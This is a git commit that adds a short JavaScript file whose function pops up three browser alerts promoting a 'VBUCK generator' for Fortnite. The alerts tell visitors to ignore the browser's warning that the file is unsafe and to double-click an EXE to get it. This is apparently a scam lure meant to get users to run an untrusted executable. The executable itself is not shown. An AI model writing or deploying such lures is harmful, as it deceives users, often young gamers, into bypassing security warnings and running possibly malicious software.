932a89b5a4b9268cb456ce05e829ed9ca25ea044
peterthecoder1234 <moserun1@outlook.com>
2022-01-22 21:14:28 -0500

    first commit

---
+++ script.js
@@ -0,0 +1,5 @@
+function Alertuser(){
+    alert("your browser may tell you the file in not safe, ignore it this is the only way to download the generator")
+    alert("(DUBBLE CLICK THE EXE FILE) TO DOWNLOAD THE VBUCK GENERATOR")
+    alert("make sure to run on a fortnite compatble divice")
+}
